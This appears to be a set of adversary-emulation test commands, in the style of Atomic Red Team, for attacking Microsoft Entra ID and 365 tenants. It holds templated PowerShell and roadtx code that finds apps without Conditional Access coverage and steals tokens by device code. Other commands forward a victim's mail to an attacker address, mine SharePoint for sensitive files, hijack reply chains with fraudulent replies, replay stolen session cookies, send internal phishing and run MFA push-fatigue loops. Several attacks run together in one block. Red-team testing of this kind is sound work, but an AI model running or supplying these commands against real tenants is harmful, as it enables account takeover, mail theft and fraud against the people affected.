atomics.executorCommand:
# Enumerate CA policies and identify unprotected apps (custom gap-finder primitive).
Import-Module Microsoft.Graph.Identity.SignIns -ErrorAction Stop
Connect-MgGraph -TenantId '#{tenant_id}' -Scopes 'Policy.Read.All' -NoWelcome

$policies      = Get-MgIdentityConditionalAccessPolicy -All
$includedApps  = @()
$excludedApps  = @()

foreach ($pol in $policies | Where-Object { $_.State -eq 'enabled' }) {
    $cond = $pol.Conditions.Applications
    if ($cond.IncludeApplications) {
        $includedApps += $cond.IncludeApplications
    }
    if ($cond.ExcludeApplications) {
        $excludedApps += $cond.ExcludeApplications
    }
}

$gapAppId = '#{gap_client_id}'
if ($includedApps -contains 'All' -and $excludedApps -notcontains $gapAppId) {
    Write-Warning "App '$gapAppId' appears to be covered by CA policies."
} else {
    Write-Host "App '$gapAppId' is not covered by all-apps CA policies – proceeding."
}

roadtx gettokens `
  --device-code `
  --client '#{gap_client_id}' `
  --resource '#{resource}' `
  --tenant '#{tenant_id}' `
  --tokenfile '#{token_output_path}'

Import-Module Microsoft.Graph.Mail -ErrorAction Stop
$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$ruleBody = @{
    displayName = '#{rule_name}'
    isEnabled   = $true
    sequence    = 1
    conditions  = @{
        subjectContains = @('#{subject_filter}')
    }
    actions = @{
        forwardTo = @(
            @{
                emailAddress = @{
                    address = '#{forwarding_address}'
                }
            }
        )
        stopProcessingRules = $true
    }
}
New-MgUserMailFolderMessageRule `
    -UserId '#{target_user_id}' `
    -MailFolderId 'inbox' `
    -BodyParameter $ruleBody

atomics.cleanupCommand:
Import-Module Microsoft.Graph.Mail -ErrorAction Stop
$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
$rules = Get-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox'
$target = $rules | Where-Object { $_.DisplayName -eq '#{rule_name}' }
if ($target) {
    Remove-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox' -MessageRuleId $target.Id -Confirm:$false
}

atomics.executorCommand:
Import-Module Microsoft.Graph.Search -ErrorAction Stop

$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$searchBody = @{
    requests = @(
        @{
            entityTypes = @('driveItem', 'listItem')
            query       = @{ queryString = '#{search_query}' }
            from        = 0
            size        = #{result_limit}
        }
    )
}

$searchResults = Invoke-MgQuerySearch -BodyParameter $searchBody

$hits = @($searchResults.HitsContainers | ForEach-Object { $_.Hits })
Write-Host "Found $($hits.Count) result(s) for query '#{search_query}'."

$hits | Select-Object -Property @{N='Name';E={$_.Resource.Name}},
                                 @{N='WebUrl';E={$_.Resource.WebUrl}},
                                 @{N='Score';E={$_.Rank}} |
    ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'

Import-Module Microsoft.Graph.Mail -ErrorAction Stop

$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$threads = Get-MgUserMessage `
    -UserId '#{sender_user_id}' `
    -Filter "contains(subject,'#{thread_subject_keyword}')" `
    -Top 5 `
    -Select 'id,subject,conversationId,toRecipients'

if (-not $threads) {
    throw "No thread found matching subject keyword '#{thread_subject_keyword}'."
}

$targetMsg = $threads | Sort-Object ReceivedDateTime | Select-Object -Last 1

$replyBody = @{
    message = @{
        body = @{
            contentType = 'Text'
            content     = '#{fraudulent_reply}'
        }
    }
    comment = '#{fraudulent_reply}'
}

Invoke-MgReplyUserMessage -UserId '#{sender_user_id}' -MessageId $targetMsg.Id -BodyParameter $replyBody
Write-Host "Reply-chain hijack sent in thread '$($targetMsg.Subject)'."

$env:HTTPS_PROXY = '#{proxy_url}'
$env:HTTP_PROXY  = '#{proxy_url}'
try {
    roadtx getcookies `
      --cookie '#{session_cookie}' `
      --tenant '#{tenant_id}' `
      --resource '#{resource}' `
      --tokenfile '#{token_output_path}'
} finally {
    $env:HTTPS_PROXY = $null
    $env:HTTP_PROXY  = $null
}

Import-Module Microsoft.Graph.Mail -ErrorAction Stop

$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$message = @{
    subject      = '#{email_subject}'
    body         = @{ contentType = 'Text'; content = '#{email_body}' }
    toRecipients = @(
        @{ emailAddress = @{ address = '#{recipient_address}' } }
    )
}

Send-MgUserMail -UserId '#{sender_user_id}' -Message $message -SaveToSentItems:$false
Write-Host "Internal phishing email sent from '#{sender_user_id}' to '#{recipient_address}'."

$attempts = #{push_attempts}
$success  = $false
for ($i = 1; $i -le $attempts; $i++) {
    Write-Host "MFA push attempt $i of $attempts..."
    $result = roadtx auth `
        --username '#{username}' `
        --password '#{password}' `
        --client '#{client_id}' `
        --tenant '#{tenant_id}' `
        --tokenfile '#{token_output_path}' 2>&1
    if ($LASTEXITCODE -eq 0) { $success = $true; break }
    Start-Sleep -Seconds 5
}
if (-not $success) {
    Write-Warning "MFA push fatigue: victim did not approve after $attempts attempts."
}
